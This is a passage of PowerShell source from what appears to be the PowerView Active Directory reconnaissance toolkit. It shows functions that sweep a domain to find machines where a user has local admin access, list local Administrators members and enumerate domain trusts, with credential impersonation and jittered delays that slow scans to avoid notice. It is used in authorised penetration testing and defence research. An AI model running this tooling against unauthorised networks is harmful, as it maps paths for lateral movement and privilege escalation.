\"smilingraccoon\" <smilingraccoon[at]gmail.com>'\n    'Royce Davis \"r3dy\" <rdavis[at]accuvant.com>'\n\n.PARAMETER ComputerName\n\nSpecifies an array of one or more hosts to enumerate, passable on the pipeline.\nIf -ComputerName is not passed, the default behavior is to enumerate all machines\nin the domain returned by Get-DomainComputer.\n\n.PARAMETER ComputerDomain\n\nSpecifies the domain to query for computers, defaults to the current domain.\n\n.PARAMETER ComputerLDAPFilter\n\nSpecifies an LDAP query string that is used to search for computer objects.\n\n.PARAMETER ComputerSearchBase\n\nSpecifies the LDAP source to search through for computers,\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER ComputerOperatingSystem\n\nSearch computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ComputerServicePack\n\nSearch computers with a specific service pack, wildcards accepted.\n\n.PARAMETER ComputerSiteName\n\nSearch computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER CheckShareAccess\n\nSwitch. Only display found shares that the local user has access to.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain and target systems.\n\n.PARAMETER Delay\n\nSpecifies the delay (in seconds) between enumerating hosts, defaults to 0.\n\n.PARAMETER Jitter\n\nSpecifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3\n\n.PARAMETER Threads\n\nThe number of threads to use for user searching, defaults to 20.\n\n.EXAMPLE\n\nFind-LocalAdminAccess\n\nFinds machines in the current domain the current user has admin access to.\n\n.EXAMPLE\n\nFind-LocalAdminAccess -Domain dev.testlab.local\n\nFinds machines in the dev.testlab.local domain the current user has admin access to.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nFind-LocalAdminAccess -Domain testlab.local -Credential $Cred\n\nFinds machines in the testlab.local domain that the user with the specified -Credential\nhas admin access to.\n\n.OUTPUTS\n\nString\n\nComputer dnshostnames the current user has administrative access to.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([String])]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DNSHostName')]\n        [String[]]\n        $ComputerName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerSearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('OperatingSystem')]\n        [String]\n        $ComputerOperatingSystem,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ServicePack')]\n        [String]\n        $ComputerServicePack,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('SiteName')]\n        [String]\n        $ComputerSiteName,\n\n        [Switch]\n        $CheckShareAccess,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $Delay = 0,\n\n        [ValidateRange(0.0, 1.0)]\n        [Double]\n        $Jitter = .3,\n\n        [Int]\n        [ValidateRange(1, 100)]\n        $Threads = 20\n    )\n\n    BEGIN {\n        $ComputerSearcherArguments = @{\n            'Properties' = 'dnshostname'\n        }\n        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }\n        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }\n        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }\n        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }\n        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }\n        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }\n        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }\n        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['ComputerName']) {\n            $TargetComputers = $ComputerName\n        }\n        else {\n            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'\n            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname\n        }\n        Write-Verbose \"[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-LocalAdminAccess] No hosts found to enumerate'\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $TokenHandle)\n\n            if ($TokenHandle) {\n                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation\n                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet\n            }\n\n            ForEach ($TargetComputer in $ComputerName) {\n                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                if ($Up) {\n                    # check if the current user has local admin access to this server\n                    $Access = Test-AdminAccess -ComputerName $TargetComputer\n                    if ($Access.IsAdmin) {\n                        $TargetComputer\n                    }\n                }\n            }\n\n            if ($TokenHandle) {\n                Invoke-RevertToSelf\n            }\n        }\n\n        $LogonToken = $Null\n        if ($PSBoundParameters['Credential']) {\n            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential\n            }\n            else {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))\"\n                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken\n            }\n        }\n        else {\n            Write-Verbose \"[Find-LocalAdminAccess] Using threading with threads: $Threads\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'TokenHandle' = $LogonToken\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n}\n\n\nfunction Find-DomainLocalGroupMember {\n<#\n.SYNOPSIS\n\nEnumerates the members of specified local group (default administrators)\nfor all the targeted machines on the current (or specified) domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetLocalGroupMember, New-ThreadedFunction  \n\n.DESCRIPTION\n\nThis function enumerates all machines on the current (or specified) domain\nusing Get-DomainComputer, and enumerates the members of the specified local\ngroup (default of Administrators) for each machine using Get-NetLocalGroupMember.\nBy default, the API method is used, but this can be modified with '-Method winnt'\nto use the WinNT service provider.\n\n.PARAMETER ComputerName\n\nSpecifies an array of one or more hosts to enumerate, passable on the pipeline.\nIf -ComputerName is not passed, the default behavior is to enumerate all machines\nin the domain returned by Get-DomainComputer.\n\n.PARAMETER ComputerDomain\n\nSpecifies the domain to query for computers, defaults to the current domain.\n\n.PARAMETER ComputerLDAPFilter\n\nSpecifies an LDAP query string that is used to search for computer objects.\n\n.PARAMETER ComputerSearchBase\n\nSpecifies the LDAP source to search through for computers,\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER ComputerOperatingSystem\n\nSearch computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ComputerServicePack\n\nSearch computers with a specific service pack, wildcards accepted.\n\n.PARAMETER ComputerSiteName\n\nSearch computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER GroupName\n\nThe local group name to query for users. If not given, it defaults to \"Administrators\".\n\n.PARAMETER Method\n\nThe collection method to use, defaults to 'API', also accepts 'WinNT'.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain and target systems.\n\n.PARAMETER Delay\n\nSpecifies the delay (in seconds) between enumerating hosts, defaults to 0.\n\n.PARAMETER Jitter\n\nSpecifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3\n\n.PARAMETER Threads\n\nThe number of threads to use for user searching, defaults to 20.\n\n.EXAMPLE\n\nFind-DomainLocalGroupMember\n\nEnumerates the local group memberships for all reachable machines in the current domain.\n\n.EXAMPLE\n\nFind-DomainLocalGroupMember -Domain dev.testlab.local\n\nEnumerates the local group memberships for all reachable machines the dev.testlab.local domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nFind-DomainLocalGroupMember -Domain testlab.local -Credential $Cred\n\nEnumerates the local group memberships for all reachable machines the dev.testlab.local\ndomain using the alternate credentials.\n\n.OUTPUTS\n\nPowerView.LocalGroupMember.API\n\nCustom PSObject with translated group property fields from API results.\n\nPowerView.LocalGroupMember.WinNT\n\nCustom PSObject with translated group property fields from WinNT results.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.LocalGroupMember.API')]\n    [OutputType('PowerView.LocalGroupMember.WinNT')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DNSHostName')]\n        [String[]]\n        $ComputerName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerSearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('OperatingSystem')]\n        [String]\n        $ComputerOperatingSystem,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ServicePack')]\n        [String]\n        $ComputerServicePack,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('SiteName')]\n        [String]\n        $ComputerSiteName,\n\n        [Parameter(ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $GroupName = 'Administrators',\n\n        [ValidateSet('API', 'WinNT')]\n        [Alias('CollectionMethod')]\n        [String]\n        $Method = 'API',\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $Delay = 0,\n\n        [ValidateRange(0.0, 1.0)]\n        [Double]\n        $Jitter = .3,\n\n        [Int]\n        [ValidateRange(1, 100)]\n        $Threads = 20\n    )\n\n    BEGIN {\n        $ComputerSearcherArguments = @{\n            'Properties' = 'dnshostname'\n        }\n        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }\n        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }\n        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }\n        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }\n        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }\n        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }\n        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }\n        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['ComputerName']) {\n            $TargetComputers = $ComputerName\n        }\n        else {\n            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'\n            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname\n        }\n        Write-Verbose \"[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $GroupName, $Method, $TokenHandle)\n\n            # Add check if user defaults to/selects \"Administrators\"\n            if ($GroupName -eq \"Administrators\") {\n                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)\n                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split \"\\\\\")[-1]\n            }\n\n            if ($TokenHandle) {\n                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation\n                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet\n            }\n\n            ForEach ($TargetComputer in $ComputerName) {\n                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                if ($Up) {\n                    $NetLocalGroupMemberArguments = @{\n                        'ComputerName' = $TargetComputer\n                        'Method' = $Method\n                        'GroupName' = $GroupName\n                    }\n                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments\n                }\n            }\n\n            if ($TokenHandle) {\n                Invoke-RevertToSelf\n            }\n        }\n\n        $LogonToken = $Null\n        if ($PSBoundParameters['Credential']) {\n            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential\n            }\n            else {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))\"\n                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken\n            }\n        }\n        else {\n            Write-Verbose \"[Find-DomainLocalGroupMember] Using threading with threads: $Threads\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'GroupName' = $GroupName\n                'Method' = $Method\n                'TokenHandle' = $LogonToken\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\n########################################################\n#\n# Domain trust functions below.\n#\n########################################################\n\nfunction Get-DomainTrust {\n<#\n.SYNOPSIS\n\nReturn all domain trusts for the current domain or a specified domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  \n\n.DESCRIPTION\n\nThis function will enumerate domain trust relationships for the current (or a remote)\ndomain using a number of methods. By default, and LDAP search using the filter\n'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified\nLDAP is used as well. If the -NET flag is specified, the .NET method\nGetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain\nobject. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is\nused to enumerate instead.\n\n.PARAMETER Domain\n\nSpecifies the domain to query for trusts, defaults to the current domain.\n\n.PARAMETER API\n\nSwitch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in\n.NET methods.\n\n.PARAMETER NET\n\nSwitch. Use .NET queries to enumerate trusts instead of the default LDAP method.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainTrust\n\nReturn domain trusts for the current domain using built in .LDAP methods.\n\n.EXAMPLE\n\nGet-DomainTrust -NET -Domain \"prod.testlab.local\"\n\nReturn domain trusts for the \"prod.testlab.local\" domain using .NET methods\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainTrust -Domain \"prod.testlab.local\" -Server \"PRIMARY.testlab.local\" -Credential $Cred\n\nReturn domain trusts for the \"prod.testlab.local\" domain enumerated through LDAP\nqueries, binding to the PRIMARY.testlab.local server for queries, and using the specified\nalternate credenitals.\n\n.EXAMPLE\n\nGet-DomainTrust -API -Domain \"prod.testlab.local\"\n\nReturn domain trusts for the \"prod.testlab.local\" domain enumerated through API calls.\n\n.OUTPUTS\n\nPowerView.DomainTrust.LDAP\n\nCustom PSObject with translated domain LDAP trust result fields (default).\n\nPowerView.DomainTrust.NET\n\nA TrustRelationshipInformationCollection returned when using .NET methods.\n\nPowerView.DomainTrust.API\n\nCustom PSObject with translated domain API trust result fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.DomainTrust.NET')]\n    [OutputType('PowerView.DomainTrust.LDAP')]\n    [OutputType('PowerView.DomainTrust.API')]\n    [CmdletBinding(DefaultParameterSetName = 'LDAP')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Parameter(ParameterSetName = 'API')]\n        [Switch]\n        $API,\n\n        [Parameter(ParameterSetName = 'NET')]\n        [Switch]\n        $NET,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [Parameter(ParameterSetName = 'API')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $TrustAttributes = @{\n            [uint32]'0x00000001' = 'NON_TRANSITIVE'\n            [uint32]'0x00000002' = 'UPLEVEL_ONLY'\n            [uint32]'0x00000004' = 'FILTER_SIDS'\n            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'\n            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'\n            [uint32]'0x00000020' = 'WITHIN_FOREST'\n            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'\n            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'\n            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'\n            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'\n            [uint32]'0x00000400' = 'PIM_TRUST'\n        }\n\n        $LdapSearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        if ($PsCmdlet.ParameterSetName -ne 'API') {\n            $NetSearcherArguments = @{}\n            if ($Domain -and $Domain.Trim() -ne '') {\n                $SourceDomain = $Domain\n            }\n            else {\n                if ($PSBoundParameters['Credential']) {\n                    $SourceDomain = (Get-Domain -Credential $Credential).Name\n                }\n                else {\n                    $SourceDomain = (Get-Domain).Name\n                }\n            }\n        }\n        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {\n            if ($Domain -and $Domain.Trim() -ne '') {\n                $SourceDomain = $Domain\n            }\n            else {\n                $SourceDomain = $Env:USERDNSDOMAIN\n            }\n        }\n\n        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {\n            # if we're searching for domain trusts through LDAP/ADSI\n            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments\n            $SourceSID = Get-DomainSID @NetSearcherArguments\n\n            if ($TrustSearcher) {\n\n                $TrustSearcher.Filter = '(objectClass=trustedDomain)'\n\n                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }\n                else { $Results = $TrustSearcher.FindAll() }\n                $Results | Where-Object {$_} | ForEach-Object {\n                    $Props = $_.Properties\n                    $DomainTrust = New-Object PSObject\n\n                    $TrustAttrib = @()\n                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }\n\n                    $Direction = Switch ($Props.trustdirection) {\n                        0 { 'Disabled' }\n                        1 { 'Inbound' }\n                        2 { 'Outbound' }\n                        3 { 'Bidirectional' }\n                    }\n\n                    $TrustType = Switch ($Props.trusttype) {\n                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }\n                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }\n                        3 { 'MIT' }\n                    }\n\n                    $Distinguishedname = $Props.distinguishedname[0]\n                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')\n                    if ($SourceNameIndex) {\n                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'\n                    }\n                    else {\n                        $SourceDomain = \"\"\n                    }\n\n                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')\n                    if ($SourceNameIndex) {\n                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)\n                    }\n                    else {\n                        $TargetDomain = \"\"\n                    }\n\n                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])\n                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value\n\n                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain\n                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]\n                    # $DomainTrust | Add-Member Noteproperty 'TargetGuid' \"{$ObjectGuid}\"\n                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType\n                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')\n                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' \"$Direction\"\n                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]\n                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]\n                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')\n                    $DomainTrust\n                }\n                if ($Results) {\n                    try { $Results.dispose() }\n                    catch {\n                        Write-Verbose \"[Get-DomainTrust] Error disposing of the Results object: $_\"\n                    }\n                }\n                $TrustSearcher.dispose()\n            }\n        }\n        elseif ($PsCmdlet.ParameterSetName -eq 'API') {\n            # if we're searching for domain trusts through Win32 API functions\n            if ($PSBoundParameters['Server']) {\n                $TargetDC = $Server\n            }\n            elseif ($Domain -and 